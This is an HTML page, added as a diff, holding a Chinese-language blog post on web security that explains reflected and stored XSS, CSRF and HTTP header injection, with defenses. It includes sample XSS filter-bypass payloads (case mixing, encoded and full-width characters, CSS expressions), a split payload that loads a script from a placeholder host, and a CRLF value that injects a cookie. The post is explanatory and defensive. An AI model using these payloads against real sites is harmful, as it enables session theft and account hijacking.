@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #000000; /*进度条颜色*/
+        height: 1px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 5px #000000, 0 0 5px     #000000; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="-WEB," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/pirlo.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="WEB安全XSS（跨站脚本攻击） XSS指的是恶意攻击者王Web页面里插入恶意HTML代码，当用户浏览该页之时，嵌入的恶意HTML代码会被执行，对受害用户可能采取COOKIE资料窃取等攻击">
+<meta name="keywords" content="-WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB安全">
+<meta property="og:url" content="http://yoursite.com/2019/02/27/WEB安全/index.html">
+<meta property="og:site_name" content="YuanChiFun&#39;s studio">
+<meta property="og:description" content="WEB安全XSS（跨站脚本攻击） XSS指的是恶意攻击者王Web页面里插入恶意HTML代码，当用户浏览该页之时，嵌入的恶意HTML代码会被执行，对受害用户可能采取COOKIE资料窃取等攻击">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-27T06:47:04.752Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB安全">
+<meta name="twitter:description" content="WEB安全XSS（跨站脚本攻击） XSS指的是恶意攻击者王Web页面里插入恶意HTML代码，当用户浏览该页之时，嵌入的恶意HTML代码会被执行，对受害用户可能采取COOKIE资料窃取等攻击">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/27/WEB安全/"/>
+
+
+
+
+
+  <title>WEB安全 | YuanChiFun's studio</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+    <a href="https://github.com/YuanChiFun" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">YuanChiFun's studio</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/27/WEB安全/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YuanChiFun">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/pirlo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YuanChiFun's studio">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WEB安全</h1>
+        
+
+        <div class="post-meta">
+         
+            <i class="fa fa-thumb-tack"></i>
+            <font color=7D26CD>置顶</font>
+            <span class="post-meta-divider">|</span>
+          
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-27T14:44:05+08:00">
+                2019-02-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB/" itemprop="url" rel="index">
+                    <span itemprop="name">-WEB</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h1><h2 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h2><blockquote>
+<p>XSS指的是恶意攻击者王Web页面里插入恶意HTML代码，当用户浏览该页之时，嵌入的恶意HTML代码会被执行，对受害用户可能采取COOKIE资料窃取等攻击</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>网络钓鱼，窃取用户账号</li>
+<li>窃取用户cookies资料，从而获得用户隐私信息，或利用用户身份进一步对网站执行操作</li>
+<li>劫持用户对话，进行非法转账</li>
+<li>恶意操作</li>
+<li>网页挂马</li>
+<li>传播跨站脚本蠕虫</li>
+</ul>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假如你现在是一个用户，你所在的网页存在跨站攻击漏洞，那么你在此刻输入一个恶意脚本去发布一个信息。那么当所有看到你新信息的人的浏览器就会执行这个脚本。</p>
+<h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>通过URL的输入，将恶意脚本附加到URL地址的参数中。能够触发恶意脚本，说明存在跨站脚本攻击漏洞。</p>
+<p>特点：</p>
+<ul>
+<li>单击时触发</li>
+<li>只触发一次</li>
+<li>通常出现在网站的搜索栏，用户登入口等地方</li>
+</ul>
+<p>在网站后面加上<code>&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<p><em>现在大部分主流浏览器已经对URL攻击做了预防方法</em></p>
+<h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><p>cookie信息被获取，存在被冒名顶替的风险，当被攻击者触发这个漏洞以后，它当前用户的cookie信息就会被发送到远端的恶意网站。攻击者登录恶意网站，查看到cookie信息后可以对这个用户的控制权限进行冒名顶替</p>
+<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>设计XSS Filter，分析用户提交的输入，并消除潜在的跨站脚本攻击，恶意的HTML输入等。在需要html输入的地方对html标签及一些特殊字符做过滤，将其转化为不被浏览器解释执行的字符。</p>
+<h3 id="持久性XSS"><a href="#持久性XSS" class="headerlink" title="持久性XSS"></a>持久性XSS</h3><blockquote>
+<p>攻击者事先将恶意JS代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意js代码的页面就会执行恶意代码</p>
+</blockquote>
+<h4 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h4><p>不需要单击URL触发，危害比反射性XSS大，能用来编写XSS蠕虫。</p>
+<h5 id="绕过XSS-Filter："><a href="#绕过XSS-Filter：" class="headerlink" title="绕过XSS Filter："></a>绕过XSS Filter：</h5><ul>
+<li>利用&lt;&gt;标记注射HTML/js<ul>
+<li>解决：过滤和转义<code>&lt;&gt;</code>或<code>&lt;script&gt;</code>等字符.</li>
+</ul>
+</li>
+<li>利用HTML标签属性值执行XSS<ul>
+<li><code>&lt;p style=&quot;javascript:alert(&quot;xss&quot;);&quot; &gt;xss&lt;p&gt;</code></li>
+<li>解决：过滤JavaScript等关键字</li>
+</ul>
+</li>
+<li>空格回车Tab<ul>
+<li>如果XSS Filter仅仅将敏感的输入字符列入黑名单，比如javascript，用户可以利用空格、回车和Tab键来绕过过滤</li>
+<li><code>&lt;p style=&quot;java   script:alert(&quot;xss&quot;);&quot; &gt;xss&lt;p&gt;</code></li>
+</ul>
+</li>
+<li>对标签属性值转码<ul>
+<li>透过这种技巧，不仅能让XSS代码绕过服务端的过滤，还能更好地隐藏Shellcode</li>
+<li><code>![](javascrip&amp;#116&amp;#58alert(/xss/);)</code></li>
+<li>解决：过滤掉&amp;#\等字符。</li>
+</ul>
+</li>
+<li>产生自己的事件<ul>
+<li><code>&lt;img src=&quot;#&quot; onerror= “alert(1)&quot;/&gt;</code></li>
+</ul>
+</li>
+<li>使用CSS跨站剖析</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert('xss')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  &lt;body &#123;background-image:url("javascript:alert('xss')");&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解决：禁用style标签，过滤标签时过滤style属性，过滤含expression、import等敏感字符的样式表</p>
+<ul>
+<li><p>扰乱过滤规则</p>
+<ul>
+<li>大小写混淆，不使用引号</li>
+</ul>
+<p><code>&lt;iMg sRC=&quot;jaVasCript:alert(0);&quot;&gt;</code></p>
+<ul>
+<li>全角字符</li>
+</ul>
+<p><code>&lt;p style=&quot;{left: ｅｘｐｒｅｓｓｉｏｎ（ａｌｅｒｔ(0)）}&quot;&gt;</code></p>
+<ul>
+<li>/**/，\和\0 </li>
+</ul>
+<p><code>&lt;div style=&quot;wid/**/th: ex\pr\0e/*XSS*/ssion(alert(&#39;xss&#39;));&quot;&gt;</code></p>
+</li>
+</ul>
+<h4 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h4><p>可以让XSS代码让过服务端的过滤，还能更好的隐藏Shellcode</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"xss:expression(alert(1));"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>####拆分跨站法</p>
+<p>当程序没有过滤xss关键字符，却对输入字符长度有限制时，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">标题<span class="number">1</span>：&lt;script&gt;z=<span class="string">'&lt;script src='</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">标题2：/z+='http://www.test.c';/</span></span><br><span class="line"><span class="comment">标题3：/z+='n/1.js&gt;&lt;/script&gt;';/</span></span><br><span class="line"><span class="comment">标题4：/*document.write(z)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>/**/在脚本标签中是注释，//之间的字符被忽略，最终转成</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=<span class="string">'&lt;script src='</span>;</span><br><span class="line">z+=<span class="string">'http://www.test.c'</span>;</span><br><span class="line">z+=<span class="string">'n/1.js&gt;&lt;/script&gt;'</span>;</span><br><span class="line"><span class="built_in">document</span>.write(z)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="XSS攻击防御"><a href="#XSS攻击防御" class="headerlink" title="XSS攻击防御"></a>XSS攻击防御</h3><ul>
+<li>输出编码<ul>
+<li><code>&lt;</code>转成<code>$lt</code>等</li>
+</ul>
+</li>
+<li>白名单，黑名单</li>
+<li>规定不能有十进制和十六进制等编码字符</li>
+<li>规定属性以双引号界定</li>
+<li>将重要的cookie设置成<code>http only</code>，这样的话<code>Javascript</code> 中的<code>document.cookie</code>语句就不能获取到<code>cookie</code>了.</li>
+</ul>
+<h4 id="前端防御组件：js-xss"><a href="#前端防御组件：js-xss" class="headerlink" title="前端防御组件：js-xss"></a>前端防御组件：js-xss</h4><p>特点</p>
+<ul>
+<li>白名单控制允许的HTML标签及各标签的属性</li>
+<li>通过自定义处理函数，可对任意标签及其属性进行处理</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
+<p>攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。</p>
+</blockquote>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>浏览并登录网站A,并在本地生成cookie</li>
+<li>在没有登出A的情况下，访问危险网站B</li>
+<li>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</li>
+</ul>
+<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><ul>
+<li>采用post请求，增加攻击的难度</li>
+<li>对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的。可以在会话中增加token，确保看到信息和提交信息的是同一个人</li>
+</ul>
+<h2 id="Http-Heads-攻击"><a href="#Http-Heads-攻击" class="headerlink" title="Http Heads 攻击"></a>Http Heads 攻击</h2><blockquote>
+<p>指攻击者通过在响应首部字段插入换行，添加任意响应首部或主体的一种攻击。</p>
+</blockquote>
+<h3 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>设置任何cookie信息</li>
+<li>重定向至任意URL</li>
+<li>显示任意的主体</li>
+</ul>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>####HTTP首部注入攻击</p>
+<p>假设一个正常的响应首部是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location:http://ex.com/?id=123;</span><br></pre></td></tr></table></figure>
+<p>攻击者用下面的内容替代后发送请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101%0D%0ASet-Cookie:+sid=111;</span><br></pre></td></tr></table></figure>
+<p>发送请求后，假设返回以下响应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Location: http://ex.com/?id=123;(%0A%0D：换行符)</span><br><span class="line">Set-Cookie: sid=111;</span><br></pre></td></tr></table></figure>
+<p>此时，首部字段Set-Cookie已生效，攻击者可指定修改任意的cookie信息。</p>
+<p>攻击者输入的%0A%0D，原本应该属于首部字段Location的查询值部分，但经过解析后，%0A%0D变成了换行符，结果插入了新的首部字段。</p>
+<h4 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h4><p>HTTP响应截断攻击使用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0A%0D并排插入字符串后发送。利用这两个连续的换行就可以做出HTTP首部与主体分隔所需的空行，这样就能显示伪造的主体，达到攻击的目的。</p>
+<h3 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h3><p>避免这种攻击的方法，就是过滤所有的response headers，除去header中出现的非法字符，尤其是CRLF。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> -WEB</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/13/VUE生命周期/" rel="next" title="VUE生命周期">
+                <i class="fa fa-chevron-left"></i> VUE生命周期
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/pirlo.jpg"
+               alt="YuanChiFun" />
+          <p class="site-author-name" itemprop="name">YuanChiFun</p>
+           
+              <p class="site-description motion-element" itemprop="description">An excellent front-end Engineer</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/YuanChiFun" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/YuanChiFun" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB安全"><span class="nav-text">WEB安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS（跨站脚本攻击）"><span class="nav-text">XSS（跨站脚本攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#危害"><span class="nav-text">危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例子"><span class="nav-text">例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射性XSS"><span class="nav-text">反射性XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#危害-1"><span class="nav-text">危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解决方法"><span class="nav-text">解决方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#持久性XSS"><span class="nav-text">持久性XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#危害-2"><span class="nav-text">危害</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过XSS-Filter："><span class="nav-text">绕过XSS Filter：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符编码"><span class="nav-text">字符编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击防御"><span class="nav-text">XSS攻击防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前端防御组件：js-xss"><span class="nav-text">前端防御组件：js-xss</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解决"><span class="nav-text">解决</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Http-Heads-攻击"><span class="nav-text">Http Heads 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#危害-3"><span class="nav-text">危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例子-1"><span class="nav-text">例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP响应截断攻击"><span class="nav-text">HTTP响应截断攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解决-1"><span class="nav-text">解决</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YuanChiFun</span>
+</div>
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>&emsp;
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+<!-- <div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
